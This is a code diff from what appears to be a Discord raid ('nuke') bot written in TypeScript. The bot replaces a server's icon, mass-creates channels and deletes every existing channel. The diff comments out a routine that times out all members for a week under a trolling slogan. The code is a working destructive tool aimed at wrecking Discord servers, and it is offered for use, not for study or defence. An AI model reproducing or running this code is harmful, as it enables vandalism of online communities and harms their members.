@@ -81,14 +81,14 @@ https://discord.gg/annycW3Xrk
       discordServer?.setIcon(
         "https://storage.googleapis.com/zenn-user-upload/b89d2505cc99-20231228.png"
       );
-      // @ts-ignore NOTE
-      (await discordServer?.members.list() ?? []).forEach(async (member: any) => {
-        if (member.id === client.user?.id) {
-          await member.timeout(0, "荒らし共栄圏万歳！");
-        } else {
-          await member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
-        }
-      });
+      //   // @ts-ignore NOTE
+      //   (await discordServer?.members.list() ?? []).forEach(async (member: any) => {
+      //     if (member.id === client.user?.id) {
+      //       await member.timeout(0, "荒らし共栄圏万歳！");
+      //     } else {
+      //       await member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
+      //     }
+      //   });
       for (let i = 0; i < max; i++) {
         discordServer?.channels
           .create({
@@ -125,7 +125,7 @@ https://discord.gg/annycW3Xrk
       discordServer?.channels.cache.forEach(async (channel) => {
         try {
           await channel.delete();
-        // deno-lint-ignore no-empty
+          // deno-lint-ignore no-empty
         } catch (_e) {}
       });
 
